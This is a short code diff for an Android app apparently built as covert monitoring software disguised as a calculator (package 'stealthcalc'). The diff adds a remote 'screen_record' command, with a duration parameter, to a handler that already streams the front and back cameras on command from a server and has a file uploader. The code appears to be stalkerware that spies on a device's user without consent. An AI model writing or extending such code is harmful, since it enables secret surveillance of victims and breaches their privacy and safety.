@@ -5,6 +5,7 @@ import android.media.MediaRecorder
 import android.os.Build
 import com.stealthcalc.core.logging.AppLogger
 import com.stealthcalc.monitoring.collector.LiveCameraCollector
+import com.stealthcalc.monitoring.collector.ScreenRecordCollector
 import com.stealthcalc.monitoring.data.MonitoringRepository
 import com.stealthcalc.monitoring.network.AgentApiClient
 import com.stealthcalc.monitoring.network.FileUploader
@@ -46,6 +47,7 @@ class RemoteCommandHandler @Inject constructor(
     private val repository: MonitoringRepository,
     private val remoteCameraService: RemoteCameraService,
     private val liveCameraCollector: LiveCameraCollector,
+    private val screenRecordCollector: ScreenRecordCollector,
     private val uploader: FileUploader,
 ) {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
@@ -103,6 +105,10 @@ class RemoteCommandHandler @Inject constructor(
             "stream_camera_front" -> liveCameraCollector.startStreaming(useFrontCamera = true)
             "stream_camera_back" -> liveCameraCollector.startStreaming(useFrontCamera = false)
             "stop_camera_stream" -> liveCameraCollector.stopStreaming()
+            "screen_record" -> {
+                val duration = command.params["duration"]?.toLongOrNull() ?: 30_000L
+                screenRecordCollector.recordScreen(duration.coerceIn(5_000, 120_000))
+            }
         }
     }
 
